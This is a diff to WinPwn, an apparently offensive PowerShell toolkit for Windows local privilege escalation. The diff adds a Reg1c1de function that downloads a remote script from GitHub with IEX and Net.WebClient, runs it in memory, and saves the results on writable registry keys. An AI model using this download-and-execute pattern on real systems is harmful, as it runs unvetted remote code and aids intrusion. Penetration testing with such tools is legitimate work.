@@ -2138,6 +2138,7 @@ function otherchecks
     } Else {
         Write-Host "Looks good! No system path can be written to by the current user." -ForegroundColor Green
     }
+    Reg1c1de >> $currentPath\LocalPrivEsc\WritebleRegistryKeys.txt
 }
 
 function winPEAS
@@ -2158,6 +2159,12 @@ function winPEAS
         Invoke-winPEAS -command ' ' >> $currentPath\LocalPrivEsc\winPEAS.txt
     }
     REG DELETE HKCU\Console\ /v VirtualTerminalLevel /f
+}
+
+function Reg1c1de
+{
+	IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Reg1c1de.ps1')
+	Invoke-Reg1c1de
 }
 
 function privescmodules
@@ -2193,7 +2200,7 @@ __        ___       ____
         do
         {
             Write-Host "================ WinPwn ================"
-            Write-Host -ForegroundColor Green '1. itm4n´s Invoke-PrivescCheck'
+            Write-Host -ForegroundColor Green '1. itm4ns Invoke-PrivescCheck'
             Write-Host -ForegroundColor Green '2. winPEAS! '
             Write-Host -ForegroundColor Green '3. Powersploits privesc checks! '
             Write-Host -ForegroundColor Green '4. All other checks! '
